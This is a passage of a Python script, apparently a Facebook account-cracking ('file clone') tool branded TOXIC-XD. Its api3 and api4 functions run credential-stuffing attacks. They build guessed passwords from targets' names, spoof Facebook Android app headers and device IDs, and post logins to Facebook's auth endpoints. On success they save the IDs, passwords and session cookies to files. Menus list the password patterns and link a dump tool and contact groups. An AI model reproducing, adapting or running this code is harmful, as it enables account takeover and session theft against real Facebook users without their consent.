        time.sleep(20)
    except Exception as e:
        pass
#====================[ FILE METHOD M3 ]================#
def api3(ids,names,passlist,total_ids):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f"\r{red}[{green}={red}] [{green}TOXIC-XD{red}]{white}-{red}[{green}{loop}{red}]{white}-{red}[{green}OK:{str(len(oks))}{red}]{white}-{red}[{cyan}{'{:.1%}'.format(loop/int(total_ids))}{red}]");sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/396.0.0.3.104;FBBV/319211820;FBDM/{density=2.625,width=1080,height=1600};FBLC/en_US;FBRV/319207818;FBCR/Ufone;FBMF/O2 - UK;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G20;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'','cpl':'true',
            'try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password','source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false','generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'es_ES','client_country_code':'ES',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in str(po):
                uid = ids
                get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                coki = f"sb={compile_coki};{get_coki}"
                print('\r\r\x1b[1;97m[\033[38;5;46mTOXIC\x1b[1;97m-\x1b[38;5;46mOK\x1b[1;97m]\x1b[38;5;46m '+uid+' | '+pas)
                print('\r\x1b[1;97m[\x1b[38;5;46mCookies\x1b[1;97m:] '+get_coki+'\x1b[1;97m')
                linex()
                oks.append(ids)
                open('/sdcard/TOXIC-OK.txt','a').write(uid+'|'+pas+'|'+get_coki+'\n')
                break
            elif "www.facebook.com" in po["error"]["message"]:
                uid = ids
                cps.append(ids)
                #print("\033[1;33m\r\r [TOXIC-CP] "+uid+" | "+pas)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#====================[ FILE METHOD M4 ]================#
def api4(ids,names,passlist,total_ids):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f"\r{red}[{green}={red}] [{green}TOXIC-XD{red}]{white}-{red}[{green}{loop}{red}]{white}-{red}[{green}OK:{str(len(oks))}{red}]{white}-{red}[{cyan}{'{:.1%}'.format(loop/int(total_ids))}{red}]");sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/294.0.0.0.84;FBBV/251510920;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/251510783;FBCR/VodafoneNZ;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'','cpl':'true',
            'try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password','source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false','generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'es_ES','client_country_code':'ES',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in str(po):
                uid = ids
                get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                coki = f"sb={compile_coki};{get_coki}"
                print('\r\r\x1b[1;97m[\033[38;5;46mTOXIC\x1b[1;97m-\x1b[38;5;46mOK\x1b[1;97m]\x1b[38;5;46m '+uid+' | '+pas)
                print('\r\x1b[1;97m[\x1b[38;5;46mCookies\x1b[1;97m:] '+get_coki+'\x1b[1;97m')
                linex()
                oks.append(ids)
                open('/sdcard/CBR-OK.txt','a').write(uid+'|'+pas+'|'+get_coki+'\n')
                break
            elif "www.facebook.com" in po["error"]["message"]:
                uid = ids
                cps.append(ids)
                #print("\033[1;33m\r\r [TOXIC-CP] "+uid+" | "+pas)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#============================[ DEF PASSWORD ]=========================#
def __pass__():
    clear()
    print(' \x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m BD FILE CLONE PASSWORD \n firstlast \n first \n last \n first1 \n first11 \n first111 \n first12 \n first1122 \n first123 \n first1234 \n first12345 \n first@ \n first@@ \n first@@@ \n first@@@@ \n first@12 \n first@123 \n first@# \n first@@## \n @first@ \n i love you ')
    linex()
    print(' \x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m BD IND RANDOM PASSWORD \n frist6 \n last6 \n frist11 \n frist8 \n last5 \n frist7 \n last8 ')
    linex()
    print(' \x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m IND FILE CLONE PASSWORD \n first last \n firstlast \n first123 \n first1234 \n first12345 \n 57273200 \n 59039200 \n 57575751 \n 57575752 ')
    xd=input(' \x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m PRESS INTER TO BACK MENU ')
#=============================[ DEF DUMP]=========================#
def ___dump___():
    clear()
    print(" \x1b[38;5;46m rm -rf FILE \n git clone --depth=1 https://github.com/CBR-404/FILE \n cd FILE \n python FILE.py ")
    xd=input(' \x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m PRESS INTER TO BACK MAIN MENU ')
#=============================[ CONTACT ADMIN DEF ]====================#
def ___cont___():
    clear()
    print (' \x1b[1;97m[\x1b[38;5;46m1\x1b[1;97m] \x1b[38;5;46mFACEBOOK ACCOUNT ')
    print (' \x1b[1;97m[\x1b[38;5;46m2\x1b[1;97m] \x1b[38;5;46mFACEBOOK PAGE ')
    print (' \x1b[1;97m[\x1b[38;5;46m3\x1b[1;97m] \x1b[38;5;46mFACEBOOK GURUP ')
    print (' \x1b[1;97m[\x1b[38;5;46m4\x1b[1;97m] \x1b[38;5;46mWHATSAPP GURUP ')
    print (' \x1b[1;97m[\x1b[38;5;46m5\x1b[1;97m] \x1b[38;5;46mWHATSAPP NUMBER ')
    linex()
    xd=input(' \x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m] \x1b[38;5;46mCHOICE...? ')
    if xd in ['A','1','01']:os.system('xdg-open https://www.facebook.com/profile.php?id=100090893042805 ')
    elif xd in ['B','b','2','02']:os.system('xdg-open https://www.facebook.com/profile.php?id=61558795443234 ')
    elif xd in ['C','c','3','03']:os.system('xdg-open https://facebook.com/groups/1635582010138391/ ')
    elif xd in ['D','d','4','04']:os.system('xdg-open https://chat.whatsapp.com/GjpKOM1BH5L4yVDdUfkuYa ')
    elif xd in ['E','e','5','05']:os.system('xdg-open wa.me//+8801911071432 ')
    else:
        ____TOXIC_XD____()
#==============================[ CODE END ]==============================#
try:
 
    apvroval.check()
except requests.exceptions.ConnectionError:
        print('\n No internet connection Bro..........!!')
        exit()
except Exception as e:
    print(e)

#-----------------------[ VERSION-SERVER ]-----------------------#
